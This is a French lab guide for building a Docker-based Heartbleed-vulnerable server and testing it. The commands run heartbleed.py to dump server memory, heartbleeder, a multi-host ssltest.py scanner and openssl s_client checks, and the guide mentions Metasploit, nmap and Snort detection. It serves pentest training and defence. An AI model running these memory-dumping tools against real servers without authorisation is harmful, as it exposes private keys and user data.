#### Récapitulatif exploiter la faille/ tester la vulnérabilité

- attaque via metasploit msfconsole
- usage de nmap avec le module ssl-heartbleed
- script
    - ssltest.py
    - heartbleed.py
    - [fox](http://blog.fox-it.com/wp-content/uploads/2014/04/fox_heartbleedtest.zip)
    - [pacemaker.py](https://github.com/Lekensteyn/pacemaker)
- tester via openssl_client 
- tester avec un ids/idps
-  heartbleeder *paquetage linux*



##### prérequis 
- outils :
    - Attaquant
        - git 
        - docker:
            - docker-ce
            - docker-compose
        - docker
    - Pentester :
        - Quasiment tout les fichiers sauf heartbleeder
            - git    
        - stimulate-server.py -- heartbleed.py -- ssltest.py
            - python:
                - python1-2
                - python3
        - Linux Debian distributions
            - heartbleeder
    - Détecteur :
        - snort

#### Mise en place via les scripts :
- Un serveur sera le serveur vulnérable 
    - On lance le script : chmod +x ../bash/*.sh && ../bash/heartbleed-vulnerable-server.sh
- Un client sera le client lambda ou pentester *test de sécurité*
    - On lance le script : chmod +x ../bash/*.sh && ../bash/heartbleed-vulnerable-pentest.sh
-  On configure les hostslist et les adresses IP sur les serveurs ou en les récupérant 
> [!NOTE]
> $ip correspond à l'adresse IP du serveur vulnérable si le serveur

##### Mise en place du serveur vulnérable :
-  Installation de Docker
`chmod +x && ./install-docker.sh  && sudo apt-get install -y docker-compose`

- Installation du serveur vulnérable avec un docker-compose.yml
```bash
sudo apt-get update -y && apt-get install -y python
git clone https://github.com/injcristianrojas/heartbleed-example.git

cd heartbleed-example
docker-compose up
```

> [!NOTE]
> A readme file is in : ./markdown/heartbleed-example/README.md
> The project is delivered with :
> Un docker-compose pour lancer le serveur vulnérable
> Un programme pour injecter de la donnée : `stimulate_server.py`
> Un script pour exploiter : `heartbleed.py` : dump le contenu du serveur et teste si le serveur est vulnérable (outil principal)


### Mise en place du serveur pentest :

#### Injecter de la donnée / stimuler le serveur cible

```bash
sudo apt-get update -y && apt-get install -y python
git clone https://github.com/injcristianrojas/heartbleed-example.git
cd heartbleed-example


chmod +x stimulate_server.py
python stimulate_server.py -a $ip
```


#### Pentest :
- Voici les principales étapes : lors de l'installation des outils :
    - Tester avec un outil de pentest :
        - install git
        - clone and cp repo
        - config hostlist
        - test

-  HEARTBLEED : *Dump la RAM*
    - script heartbleed.py
    
    ```bash
        sudo apt-get update -y && apt-get install -y python
        git clone https://github.com/injcristianrojas/heartbleed-example.git
        cd heartbleed-example


        chmod +x heartbleed.py
        python heartbleed.py $ip -p 443
        python heartbleed.py $ip -p 443 -v -n 50
    ```


- Paquetage linux heartbleeder : *Check*

```bash
sudo apt-get update -y && apt-get install -y heartbleeder && sudo apt-get autoremove -y
heartbleeder $ip:443
```


-  Usage du script ssltest.py : *Check*

```bash
apt-get update -y && apt-get install -y python
apt-get update -y && apt-get install -y git 
git clone https://github.com/tdussa/heartbleed-masstest.git
cd heartbleed-masstest
nano hostlist.txt && chmod +x ssltest.py
./ssltest.py --ports "443, 993, 995, 44330" hostlist.txt
```

- tester via openssl_client *Check and dump*

```bash
openssl s_client -connect $ip:44330 -tlsextdebug | grep "TLS server extension"
```


- mais au préalable
    - mise en place du serveur vulnérable depuis le serveur docker ou un autre serveur
    ```bash
    openssl s_server -key /etc/ssl/private/apache-selfsigned.key -cert /etc/ssl/certs/apache-selfsigned.crt -accept 44330 -www
    ```


#### attaque :
- attaque via metasploit msfconsole
- usage de nmap avec le module ssl-heartbleed





==============================================================================================
### mise en place du serveur vulnérable sur Windows
- En cas de problème de ports :
    ```powershell
    netstat -aon | find ":443"
    tasklist /SVC /FI "PID eq 15524"
    ```
    
   *tuer le processus ex: VMWARE*


======================
#####  Mise en place de snort
<!-- - launch sol2
    - Select Save from the bar on top and close the file. At this point, Snort is ready to run.   
    Except, it doesn’t have any rules loaded. To verify, run the following command:    
    `sudo snort -T -i eth0 -c /etc/snort/snort.conf`
    - Now, let’s start Snort in IDS mode and tell it to display alerts to the console:
    `sudo snort -A console -q -c /etc/snort/snort.conf -i eth0` -->